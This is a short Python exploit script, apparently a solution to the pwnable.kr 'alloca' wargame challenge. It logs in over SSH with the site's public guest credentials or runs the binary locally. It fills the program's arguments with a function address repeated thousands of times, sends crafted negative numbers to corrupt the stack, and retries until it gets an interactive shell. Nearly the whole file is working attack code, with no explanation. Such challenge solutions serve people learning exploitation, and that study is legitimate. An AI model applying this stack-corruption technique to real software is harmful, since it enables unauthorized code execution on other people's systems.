from pwn import *
import time
import argh


context.log_level = 'info'

host = 'pwnable.kr'
user = 'alloca'
port = 2222
password = 'guest'


def communicate(p):
    p.recvuntil('here is how to.\n\n')
    p.recvuntil('let me show you.\n\n')
    p.sendline('-82')
    p.sendline('-2445310')
    p.recvuntil('\n\n')
    time.sleep(1)


@argh.arg('--local', '-l', help='Run Locally')
@argh.arg('--runpwn', '-r', help='Run Remotly')
def main(local=False, runpwn=False):
    p = None
    bin_path = './alloca'
    e = ELF(bin_path)
    argv = [bin_path, p32(e.symbols.callme)*32000]

    while True:
        if local:
            p = process(argv=argv, env={}, aslr=False)
        elif runpwn:
            s = ssh(user, host, port, password)
            p = s.process(argv=argv, env={}, aslr=False)

        communicate(p)
        p.wait(2)
        if p.poll() != 11:
            p.interactive()


if __name__ == '__main__':
    argh.dispatch_command(main)

